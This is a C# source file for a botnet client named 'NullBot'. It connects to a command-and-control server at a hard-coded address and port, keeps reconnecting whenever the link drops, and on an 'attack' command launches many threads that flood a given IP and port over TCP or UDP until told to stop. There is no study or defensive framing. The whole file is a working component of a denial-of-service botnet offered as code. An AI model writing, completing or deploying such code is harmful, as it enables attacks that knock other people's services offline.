using SimpleTCP;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Threading;

namespace NullBot
{
    internal class ClientHandler
    {
        private List<Thread> threads = new List<Thread>();
        private SimpleTcpClient client;
        private bool isConnected = false;
        private bool isReconnecting = false;
        private string test = "127.0.0.1";
        private int test1 = 6969;
        private CancellationTokenSource cts;

        public void Start()
        {
            client = new SimpleTcpClient();
            client.DataReceived += OnDataReceived;
            ConnectToServer();
        }

        private void OnDataReceived(object sender, Message msg)
        {
            string[] input = msg.MessageString.Trim().Split(' ');
            Console.WriteLine(msg.MessageString);

            if (input[0].Equals("stop", StringComparison.OrdinalIgnoreCase))
            {
                Console.WriteLine("Stopping all attack threads");
                StopAllThreads();
            }
            else if (input[0].Equals("attack", StringComparison.OrdinalIgnoreCase) && input.Length >= 5)
            {
                StartAttack(input);
            }
            else
            {
                Console.WriteLine("Received unknown command");
            }
        }

        private void StartAttack(string[] input)
        {
            if (input.Length != 5)
            {
                Console.WriteLine($"Expected 5 parameters but received {input.Length}. Please use: attack [IP] [PORT] [TCP/UDP] [THREADS]");
                return;
            }

            string targetIP = input[1].Trim();
            int port;
            string method = input[3].Trim().ToLower();
            int threadCount = 5;
            byte[] bytes = { 0xff };

            if (!Int32.TryParse(input[2].Trim(), NumberStyles.Integer, CultureInfo.InvariantCulture, out port))
            {
                Console.WriteLine($"Invalid port number format: '{input[2]}'. Please enter a valid integer.");
                return;
            }

            if (!Int32.TryParse(input[4].Trim(), NumberStyles.Integer, CultureInfo.InvariantCulture, out threadCount))
            { 
                Console.WriteLine($"Invalid thread number format: '{input[4]}'. Set it to 5 now");
                threadCount = 5;               
            }

            if (port < 1 || port > 65535)
            {
                Console.WriteLine($"Invalid port number: {port}. Must be between 1 and 65535.");
                return;
            }

            if (threadCount < 1)
            {
                Console.WriteLine($"Invalid thread count: {threadCount}. Must be greater than 0.");
                return;
            }

            Console.WriteLine($"Starting attack on {targetIP}:{port} using method {method}");
            cts = new CancellationTokenSource();
            for (int i = 0; i < threadCount; i++)
            {
                string ip = targetIP;
                int portToUse = port;
                string attackMethod = method;

                Thread t = new Thread(() =>
                {
                    var attackClass = new Attack();
                    while (!cts.Token.IsCancellationRequested)
                    {
                        attackClass.Shoot(ip, portToUse, bytes, attackMethod);
                    }
                });

                threads.Add(t);
                t.Start();
            }
        }

        private void StopAllThreads()
        {
            cts?.Cancel();
            foreach (Thread t in threads)
            {
                if (t.IsAlive)
                {
                    t.Abort();                    
                }
            }
            threads.Clear();
            cts = null;
        }

        private void ConnectToServer()
        {
            new Thread(() =>
            {
                while (true)
                {
                    try
                    {
                        if (!isConnected)
                        {
                            client.Connect(test, test1);
                            Console.WriteLine("Connected to the Server");
                            isConnected = true;
                            StartConnectionMonitor();
                        }
                        Thread.Sleep(5000);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Connection attempt failed: {ex.Message}");
                        isConnected = false;
                        Thread.Sleep(2000);
                    }
                }
            }).Start();
        }

        private void StartConnectionMonitor()
        {
            new Thread(() =>
            {
                while (isConnected)
                {
                    if (client.TcpClient == null || !client.TcpClient.Connected)
                    {
                        Console.WriteLine("Connection lost. Attempting to reconnect...");
                        isConnected = false;
                        ReconnectToServer();
                        break;
                    }
                    Thread.Sleep(5000);
                }
            }).Start();
        }

        private void ReconnectToServer()
        {
            if (isReconnecting)
                return;

            isReconnecting = true;
            while (!isConnected)
            {
                try
                {
                    client.Dispose();
                    client = new SimpleTcpClient();
                    client.DataReceived += OnDataReceived;

                    client.Connect(test, test1);
                    Console.WriteLine("Reconnected to the Server");
                    isConnected = true;
                    isReconnecting = false;

                    StartConnectionMonitor();
                    break;
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Reconnection attempt failed: {ex.Message}");
                    Thread.Sleep(2000);
                }
            }
        }
    }
}
